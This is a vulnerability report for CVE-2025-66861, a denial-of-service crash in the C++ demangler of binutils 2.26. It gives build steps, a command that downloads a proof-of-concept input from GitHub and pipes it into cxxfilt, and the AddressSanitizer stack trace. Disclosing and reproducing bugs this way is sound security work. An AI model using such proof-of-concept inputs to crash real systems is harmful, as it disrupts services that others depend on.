Use CVE-2025-66861 for:

** RESERVED ** An issue was discovered in function d_unqualified_name in file cp-demangle.c in BinUtils 2.26 allowing attackers to cause a denial of service via crafted PE file.


# SEGV /binutils-2.26/libiberty/./cp-demangle.c:1596:7 in d_unqualified_name

## Environment
docker image:silkeh/clang:12(Debian GNU/Linux 11 64 bit, clang 12.0.1)
binutils 2.26

## Steps to reproduce
1. start docker container
```
docker run -it --rm silkeh/clang:12 bash
```
2. download file
```
wget http://ftp.gnu.org/gnu/binutils/binutils-2.26.tar.gz
tar -xzf binutils-2.26.tar.gz 
cd binutils-2.26
```
3. compile
```
export CC="clang"
export CFLAGS="-g -Wno-error -fsanitize=address"
# avoid memory leak warnings detected by the LeakSanitizer (LSan) tool.
export ASAN_OPTIONS=detect_leaks=0
./configure
make -j
```
4. download poc1: 
```
wget https://github.com/caozhzh/CRGF-Vul/raw/refs/heads/main/pocs/poc1
```
5. command for reproducing the error
```
cat poc1 | binutils/cxxfilt
```

## crash report
```
> cat poc1 | binutils/cxxfilt 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==27924==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x00000087be86 bp 0x7ffc63aaf760 sp 0x7ffc63aaf680 T0)
==27924==The signal is caused by a READ memory access.
==27924==Hint: this fault was caused by a dereference of a high value address (see register values below).  Disassemble the provided pc to learn which register was used.
    #0 0x87be86 in d_unqualified_name /binutils-2.26/libiberty/./cp-demangle.c:1596:7
    #1 0x880356 in d_expression_1 /binutils-2.26/libiberty/./cp-demangle.c:3161:14
    #2 0x8755b9 in d_expression /binutils-2.26/libiberty/./cp-demangle.c:3334:9
    #3 0x871308 in cplus_demangle_type /binutils-2.26/libiberty/./cp-demangle.c:2498:9
    #4 0x873a9c in d_pointer_to_member_type /binutils-2.26/libiberty/./cp-demangle.c:2891:8
    #5 0x870319 in cplus_demangle_type /binutils-2.26/libiberty/./cp-demangle.c:2350:13
    #6 0x873a9c in d_pointer_to_member_type /binutils-2.26/libiberty/./cp-demangle.c:2891:8
    #7 0x870319 in cplus_demangle_type /binutils-2.26/libiberty/./cp-demangle.c:2350:13
    #8 0x873ac8 in d_pointer_to_member_type /binutils-2.26/libiberty/./cp-demangle.c:2910:9
    #9 0x870319 in cplus_demangle_type /binutils-2.26/libiberty/./cp-demangle.c:2350:13
    #10 0x87e5eb in d_parmlist /binutils-2.26/libiberty/./cp-demangle.c:2737:14
    #11 0x87a34d in d_bare_function_type /binutils-2.26/libiberty/./cp-demangle.c:2791:8
    #12 0x86f2c0 in d_encoding /binutils-2.26/libiberty/./cp-demangle.c:1296:6
    #13 0x86e717 in cplus_demangle_mangled_name /binutils-2.26/libiberty/./cp-demangle.c:1172:7
    #14 0x878118 in d_demangle_callback /binutils-2.26/libiberty/./cp-demangle.c:5894:7
    #15 0x8776ef in d_demangle /binutils-2.26/libiberty/./cp-demangle.c:5945:12
    #16 0x877575 in cplus_demangle_v3 /binutils-2.26/libiberty/./cp-demangle.c:6102:10
    #17 0x850a16 in cplus_demangle /binutils-2.26/libiberty/./cplus-dem.c:864:13
    #18 0x4cc2f9 in demangle_it /binutils-2.26/binutils/cxxfilt.c:62:12
    #19 0x4cbf3c in main /binutils-2.26/binutils/cxxfilt.c:275:4
    #20 0x7f23fedc1d79 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x23d79)
    #21 0x41f4e9 in _start (/binutils-2.26/binutils/cxxfilt+0x41f4e9)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /binutils-2.26/libiberty/./cp-demangle.c:1596:7 in d_unqualified_name
==27924==ABORTING
```